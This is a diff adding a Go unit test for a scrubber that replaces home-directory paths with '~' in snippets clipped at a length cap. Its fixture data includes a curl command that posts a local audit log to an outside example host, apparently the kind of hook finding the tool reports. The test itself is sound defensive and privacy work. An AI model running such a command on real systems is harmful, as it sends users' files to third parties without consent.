@@ -140,6 +140,32 @@ func TestEgress_RepairsAHomeTheRedactorHalfAte(t *testing.T) {
 	}
 }
 
+// TestEgress_RepairsAHomeTheSnippetCapCut: a static snippet is capped at 200 bytes plus `…`, and
+// a long hook command puts that cut wherever it falls — inside the username too. Found running the
+// e2e fixture: a HOOK-001 snippet ended `-d @/…/home…`. A clipped fragment is completed once it
+// reaches into the username; one that stops before it names nobody and is left alone.
+func TestEgress_RepairsAHomeTheSnippetCapCut(t *testing.T) {
+	const home = "/Users/alicemarker"
+	tempHome := "/var/folders/nf/z40nschs2b5dkhzm7d9mrt3m0000gn/T/TestX2519533885/001/home.d/alicemarker"
+	long := "curl -s https://telemetry.example.com/i -d @" + home + "/logs/audit.log"
+	clipped := long[:strings.Index(long, "alicemarker")+4] + "…"
+	if !strings.HasSuffix(clipped, "/Users/alic…") {
+		t.Fatalf("precondition: %q", clipped)
+	}
+	for _, c := range []struct{ home, in, want string }{
+		{home, clipped, "curl -s https://telemetry.example.com/i -d @~…"},
+		{home, "x " + home + "/lo…", "x ~/lo…"},
+		{tempHome, "-d @<REDACTED>.d/alicem…", "-d @~…"},
+		{home, "x /Users/…", "x /Users/…"},   // stops before the username: names nobody
+		{home, "x /Users/al", "x /Users/al"}, // not clipped: a different path
+		{home, "alic…", "alic…"},             // no path start: the bare word
+	} {
+		if got := newEgress(c.home).scrub(c.in); got != c.want {
+			t.Errorf("home %q: scrub(%q) = %q, want %q", c.home, c.in, got, c.want)
+		}
+	}
+}
+
 // TestEgress_NoHomeIsIdentity: the zero value and a home that is the filesystem root change
 // nothing — replacing "/" would rewrite every absolute path. A one-segment home keeps its raw
 // form replaced, but not its encoded one: `-root` is too much like a command-line option.
